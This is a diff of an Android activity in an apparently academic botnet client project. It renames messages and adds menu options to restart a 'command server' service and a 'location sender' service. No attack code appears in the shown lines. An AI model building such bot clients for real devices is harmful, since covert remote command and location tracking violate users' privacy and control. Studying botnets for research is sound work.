@@ -2,17 +2,27 @@ package de.tudarmstadt.botnet.janus_yanai;
 
 import java.util.Map;
 
-import android.content.*;
-import android.app.*;
-import android.view.*;
-import android.os.*;
-import android.preference.PreferenceManager;
-import android.view.View.OnKeyListener;
-import android.widget.*;
-import android.view.ViewGroup.LayoutParams;
-import android.util.*;
+import android.app.Activity;
+import android.app.Service;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.ServiceConnection;
+import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
-import android.view.View.*;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.util.Log;
+import android.view.Menu;
+import android.view.MenuItem;
+import android.view.View;
+import android.view.ViewGroup.LayoutParams;
+import android.widget.CheckBox;
+import android.widget.CompoundButton;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import android.widget.Toast;
 
 public class BotClientActivity extends Activity {
 	
@@ -177,7 +187,7 @@ public void beforeTextChanged(CharSequence s, int start, int count, int after) {
         startActivity(myIntent);
     }
     public void onNotifyServerButtonClick(View view) {
-    	BootCompleteReceiver.sendNotification(this, true);
+    	BootCompleteReceiver.getInstance(this).sendNotification(true);
     }
     
     public void manualStartServer(View view) {
@@ -190,7 +200,8 @@ public void beforeTextChanged(CharSequence s, int start, int count, int after) {
     	doBindService2();
     }
     
-	final static int ID_RESTART = 3000;
+	final static int ID_RESTARTSERVER1 = 3000;
+	final static int ID_RESTARTSERVER2 = 4000;
 	
 	private ServerService mBoundService1;
 	private boolean mIsBound1;
@@ -204,14 +215,14 @@ public void beforeTextChanged(CharSequence s, int start, int count, int after) {
 
 	        //mBoundService1 = new ServerService();
 	        
-	        Toast.makeText(BotClientActivity.this, "local service connected",
+	        Toast.makeText(BotClientActivity.this, "local command server service connected",
 	                Toast.LENGTH_SHORT).show();
 	    }
 
 	    public void onServiceDisconnected(ComponentName className) {
 	    	//we should never see this happen
 	        mBoundService1 = null;
-	        Toast.makeText(BotClientActivity.this, "local service disconnected",
+	        Toast.makeText(BotClientActivity.this, "local command server service disconnected",
 	                Toast.LENGTH_SHORT).show();
 	    }
 	};
@@ -223,14 +234,14 @@ public void beforeTextChanged(CharSequence s, int start, int count, int after) {
 
 	        //mBoundService2 = new LocationService();
 	        
-	        Toast.makeText(BotClientActivity.this, "local service connected",
+	        Toast.makeText(BotClientActivity.this, "local location sender service connected",
 	                Toast.LENGTH_SHORT).show();
 	    }
 
 	    public void onServiceDisconnected(ComponentName className) {
 	    	//we should never see this happen
 	        mBoundService2 = null;
-	        Toast.makeText(BotClientActivity.this, "local service disconnected",
+	        Toast.makeText(BotClientActivity.this, "local location sender service disconnected",
 	                Toast.LENGTH_SHORT).show();
 	    }
 	};
@@ -239,19 +250,27 @@ public void beforeTextChanged(CharSequence s, int start, int count, int after) {
 	
 	@Override
 	public boolean onCreateOptionsMenu(Menu menu) {
-		menu.add(android.view.Menu.NONE, ID_RESTART, android.view.Menu.NONE, "Restart server");
+		menu.add(android.view.Menu.NONE, ID_RESTARTSERVER1, android.view.Menu.NONE, "Restart command server");
+		menu.add(android.view.Menu.NONE, ID_RESTARTSERVER2, android.view.Menu.NONE, "Restart location server");
 		return true;
 	}
 
 	@Override
 	public boolean onOptionsItemSelected(MenuItem item) {
 		switch (item.getItemId()) {
-		case ID_RESTART:
+		case ID_RESTARTSERVER1:
 			if (mBoundService1 == null) { Toast.makeText(this, "Service null...", Toast.LENGTH_SHORT).show(); return true; }
 			mBoundService1.stopSelf();
 			doUnbindService1();
 			doBindService1();
-			Toast.makeText(this, "restarted", Toast.LENGTH_SHORT).show();
+			Toast.makeText(this, "restarted command server", Toast.LENGTH_SHORT).show();
+			return true;
+		case ID_RESTARTSERVER2:
+			if (mBoundService2 == null) { Toast.makeText(this, "Service null...", Toast.LENGTH_SHORT).show(); return true; }
+			mBoundService2.stopSelf();
+			doUnbindService2();
+			doBindService2();
+			Toast.makeText(this, "restarted location sender", Toast.LENGTH_SHORT).show();
 			return true;
 		default:
 			return super.onOptionsItemSelected(item);
